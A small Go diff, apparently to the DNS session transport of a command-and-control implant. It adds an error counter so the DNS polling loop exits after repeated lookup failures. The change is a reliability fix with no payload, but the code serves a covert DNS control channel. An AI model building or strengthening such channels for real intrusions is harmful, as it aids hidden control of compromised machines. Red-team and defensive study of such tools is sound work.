@@ -341,6 +341,7 @@ func dnsSessionSendEnvelope(parentDomain string, sessionID string, sessionKey AE
 // --------------------------- DNS SESSION RECV ---------------------------
 
 func dnsSessionPoll(parentDomain string, sessionID string, sessionKey AESKey, ctrl chan bool, recv chan *pb.Envelope) {
+	error_counter := 0
 	for {
 		select {
 		case <-ctrl:
@@ -353,7 +354,14 @@ func dnsSessionPoll(parentDomain string, sessionID string, sessionKey AESKey, ct
 				// {{if .Config.Debug}}
 				log.Printf("Lookup error %v", err)
 				// {{end}}
+				error_counter += 1
+				if error_counter > 3{
+					return
+				}
+			} else {
+				error_counter = 0
 			}
+
 			if txt == "0" {
 				continue
 			}
